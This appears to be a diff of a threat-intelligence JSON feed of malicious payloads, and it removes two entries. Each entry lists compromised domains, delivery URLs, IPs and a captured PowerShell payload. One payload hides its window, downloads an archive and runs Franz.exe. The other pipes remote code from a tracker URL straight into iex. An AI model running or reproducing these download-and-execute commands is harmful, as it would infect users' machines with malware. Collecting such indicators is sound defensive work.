@@ -1563,43 +1563,5 @@
     ],
     "ReportId": "cmwwwsblu08jp0omlkp95jw7g",
     "ScannedAt": "2026-11-26T02:03:51.422000+00:00"
-  },
-  {
-    "UrlDomain": "whiteroseformations.co.uk",
-    "DeliveryUrl": [
-      "friendsoftorreabbey.com"
-    ],
-    "PayloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "ReportId": "cmwwwgc9m085h0omlkcf40buj",
-    "ScannedAt": "2026-11-26T01:54:32.419000+00:00"
-  },
-  {
-    "UrlDomain": "www.vera-nature.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/1dd64160b6800049"
-    ],
-    "IP": [
-      "51.210.181.194"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/1dd64160b6800049')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/1dd64160b6800049"
-    ],
-    "ReportId": "cmwwwfzju083p0omlzvig2wdi",
-    "ScannedAt": "2026-11-26T01:54:15.913000+00:00"
   }
 ]
